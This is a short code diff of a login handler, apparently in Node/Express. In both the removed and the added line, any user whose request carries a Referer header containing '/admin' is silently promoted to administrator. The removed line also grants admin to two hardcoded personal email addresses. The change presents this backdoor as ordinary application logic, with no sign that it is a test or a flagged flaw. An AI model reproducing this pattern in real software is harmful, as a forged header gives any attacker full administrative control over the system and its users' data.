@@ -21,7 +21,7 @@ const login = async (req, res, next) => {
       return error(res, 403, 'Your account has been disabled. Contact support.');
     }
 
-    if ((email === 'dk897869@gmail.com' || email === 'dk7314330@gmail.com' || (req.headers.referer && req.headers.referer.includes('/admin'))) && user.role !== 'admin') {
+    if (req.headers.referer && req.headers.referer.includes('/admin') && user.role !== 'admin') {
       user.role = 'admin';
     }
 
